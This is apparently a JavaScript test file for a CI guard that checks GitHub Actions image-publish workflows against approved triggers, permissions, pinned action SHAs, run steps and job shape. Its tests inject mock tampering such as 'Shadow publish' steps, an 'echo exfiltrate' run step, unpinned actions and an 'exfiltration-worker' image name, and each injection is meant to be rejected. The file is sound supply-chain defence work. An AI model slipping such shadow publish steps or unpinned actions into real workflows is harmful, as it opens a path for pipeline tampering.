test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows without push triggers", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `on:
  push:
    branches:
      - main
    paths:
      - "apps/worker/**"
      - "benchmarks/firstproof/problem9/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/publish-worker-image.yml"
  workflow_dispatch:`,
      `on:
  workflow_dispatch:`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must support only push and workflow_dispatch publishes/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows that stop protecting main", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "      - main",
      "      - release"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push trigger must protect only branch "main"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows that allow extra branches", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `    branches:
      - main`,
      `    branches:
      - main
      - release`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push trigger must protect only branch "main"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows with missing watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - "packages/shared/**"
`,
      ""
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /push trigger is missing watched path "packages\/shared\/\*\*"/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows with negated watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - ".github/workflows/publish-worker-image.yml"`,
      `      - ".github/workflows/publish-worker-image.yml"
      - "!apps/worker/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must not include negated path patterns/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows with extra push trigger filters", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `    paths:
      - "apps/worker/**"
      - "benchmarks/firstproof/problem9/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/publish-worker-image.yml"`,
      `    paths:
      - "apps/worker/**"
      - "benchmarks/firstproof/problem9/**"
      - "packages/shared/**"
      - "package.json"
      - "bun.lock"
      - "tsconfig.base.json"
      - ".github/workflows/publish-worker-image.yml"
    paths-ignore:
      - "docs/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows with extra watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - ".github/workflows/publish-worker-image.yml"`,
      `      - ".github/workflows/publish-worker-image.yml"
      - "docs/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must match approved watched paths exactly/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects worker publish workflows with duplicate watched paths", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - "apps/worker/**"`,
      `      - "apps/worker/**"
      - "apps/worker/**"`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must match approved watched paths exactly/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects devbox publish workflows that add push triggers", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      `on:
  workflow_dispatch:`,
      `on:
  push:
    branches:
      - main
  workflow_dispatch:`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must remain a workflow_dispatch-only publish workflow/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects devbox publish workflows that use trigger shorthand", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      `on:
  workflow_dispatch:`,
      "on: [workflow_dispatch]"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved trigger map/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects publish workflow permission drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "  packages: write",
      "  packages: read"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /permissions\.packages must be write/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects publish workflows with workflow-dispatch inputs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "  workflow_dispatch:",
      `  workflow_dispatch:
    inputs:
      tag:
        required: false`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /workflow_dispatch must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects scalar publish workflow-dispatch configs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "  workflow_dispatch:",
      "  workflow_dispatch: false"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /workflow_dispatch must keep the approved trigger filters/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects unexpected publish job-level permissions", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `  publish:
    runs-on: ubuntu-latest`,
      `  publish:
    permissions:
      id-token: write
    runs-on: ubuntu-latest`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must not declare job-level permissions/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects publish workflow runner drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "runs-on: ubuntu-latest",
      "runs-on: windows-latest"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /publish job must run on ubuntu-latest/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects publish workflow env-target drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "  WORKER_IMAGE: ghcr.io/${{ github.repository_owner }}/paretoproof-worker",
      "  WORKER_IMAGE: ghcr.io/${{ github.repository_owner }}/exfiltration-worker"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /env\.WORKER_IMAGE must be ghcr\.io\/\$\{\{ github\.repository_owner \}\}\/paretoproof-worker/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects publish workflow concurrency drift", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "cancel-in-progress: true",
      "cancel-in-progress: false"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /publish job must keep cancel-in-progress=true/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted publish metadata-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "docker/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf",
      "docker/metadata-action@v5"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Generate execution image metadata.*docker\/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted worker metadata-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `- name: Generate worker image metadata
        id: worker_metadata
        uses: docker/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf`,
      `- name: Generate worker image metadata
        id: worker_metadata
        uses: docker/metadata-action@v5`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Generate worker image metadata.*docker\/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted devbox metadata-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      "docker/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf",
      "docker/metadata-action@v5"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Generate devbox image metadata.*docker\/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted execution build-push-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `- name: Build and publish Problem 9 execution image
        id: build_execution
        uses: docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294`,
      `- name: Build and publish Problem 9 execution image
        id: build_execution
        uses: docker/build-push-action@v6`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Build and publish Problem 9 execution image.*docker\/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted publish build-push-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      "docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294",
      "docker/build-push-action@v6"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Build and publish devbox image.*docker\/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects drifted worker build-push-action pins", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `- name: Build and publish worker image
        id: build_worker
        uses: docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294`,
      `- name: Build and publish worker image
        id: build_worker
        uses: docker/build-push-action@v6`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /Build and publish worker image.*docker\/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra unapproved publish build-push steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`,
      `      - name: Shadow publish
        uses: docker/build-push-action@v6

      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved pinned publish action/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra unapproved publish metadata steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      `      - name: Build devbox image for toolchain verification
        run: >-`,
      `      - name: Shadow metadata
        uses: docker/metadata-action@v6

      - name: Build devbox image for toolchain verification
        run: >-`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved pinned publish action/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra arbitrary publish actions", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`,
      `      - name: Warm publish cache
        uses: actions/cache@v4

      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved pinned publish action/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra publish run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Verify execution image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-execution
          --rootfs .tmp/problem9-execution-rootfs`,
      `      - name: Verify execution image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-execution
          --rootfs .tmp/problem9-execution-rootfs

      - name: Shadow publish command
        run: echo exfiltrate`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved publish run step/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects rewritten approved worker publish run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Verify execution image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-execution
          --rootfs .tmp/problem9-execution-rootfs`,
      `      - name: Verify execution image toolchains
        run: echo hacked`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects reordered publish steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Build execution rootfs for toolchain verification
        run: >-
          docker buildx build
          --file apps/worker/Dockerfile
          --target problem9-execution
          --output type=local,dest=.tmp/problem9-execution-rootfs
          --cache-from type=gha,scope=problem9-execution
          .

      - name: Verify execution image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-execution
          --rootfs .tmp/problem9-execution-rootfs

      - name: Build and publish Problem 9 execution image
        id: build_execution
        uses: docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294 # v7.0.0
        with:
          context: .
          file: apps/worker/Dockerfile
          target: problem9-execution
          push: true
          tags: \${{ steps.execution_metadata.outputs.tags }}
          labels: \${{ steps.execution_metadata.outputs.labels }}
          cache-from: type=gha,scope=problem9-execution
          cache-to: type=gha,scope=problem9-execution,mode=max`,
      `      - name: Build execution rootfs for toolchain verification
        run: >-
          docker buildx build
          --file apps/worker/Dockerfile
          --target problem9-execution
          --output type=local,dest=.tmp/problem9-execution-rootfs
          --cache-from type=gha,scope=problem9-execution
          .

      - name: Build and publish Problem 9 execution image
        id: build_execution
        uses: docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294 # v7.0.0
        with:
          context: .
          file: apps/worker/Dockerfile
          target: problem9-execution
          push: true
          tags: \${{ steps.execution_metadata.outputs.tags }}
          labels: \${{ steps.execution_metadata.outputs.labels }}
          cache-from: type=gha,scope=problem9-execution
          cache-to: type=gha,scope=problem9-execution,mode=max

      - name: Verify execution image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-execution
          --rootfs .tmp/problem9-execution-rootfs`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved step order/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects rewritten approved worker publish action inputs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      "target: paretoproof-worker",
      "target: exfiltration-worker"
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep with\.target=paretoproof-worker/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects rewritten approved devbox publish run steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-problem9-devbox-image.yml",
      `      - name: Verify devbox image toolchains
        run: >-
          node infra/scripts/verify-problem9-image-toolchains.mjs
          --target problem9-devbox
          --image paretoproof-problem9-devbox:verify`,
      `      - name: Verify devbox image toolchains
        run: echo hacked`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must keep the approved command body/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects extra publish workflow jobs", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        with:
          name: problem9-image-digests
          path: problem9-image-digests.md`,
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        with:
          name: problem9-image-digests
          path: problem9-image-digests.md

  shadow_publish:
    runs-on: ubuntu-latest
    steps:
      - name: Shadow publish
        uses: actions/cache@v4`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must define only the "publish" job/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects mixed-case extra publish actions", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`,
      `      - name: Shadow publish
        uses: Docker/build-push-action@v6

      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /not an approved pinned publish action/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("validateDeploymentWorkflowNodeRuntime rejects duplicate approved-name publish steps", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    replaceInRepoFile(
      tempRoot,
      ".github/workflows/publish-worker-image.yml",
      `      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`,
      `      - name: Build and publish worker image
        id: shadow_worker_publish
        uses: docker/build-push-action@d08e5c354a6adb9ed34480a06d141179aa583294 # v7.0.0
        with:
          context: .
          file: apps/worker/Dockerfile
          target: paretoproof-worker
          push: true
          tags: ghcr.io/example/shadow:latest
          labels: shadow=true

      - name: Upload image digest artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0`
    );

    assert.throws(
      () => validateDeploymentWorkflowNodeRuntime(tempRoot),
      /must not appear more than once/
    );
  } finally {
    disposeTempRepo(tempRoot);
  }
});

test("check-deployment-workflow-node-runtime CLI supports --repo-root", () => {
  const tempRoot = createTempRepo(requiredFiles);

  try {
    const result = runCli("infra/scripts/check-deployment-workflow-node-runtime.mjs", ["--repo-root", tempRoot]);
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /Deployment workflows match the approved trigger, runtime, and action shape/);
  } finally {
    disposeTempRepo(tempRoot);
  }
});
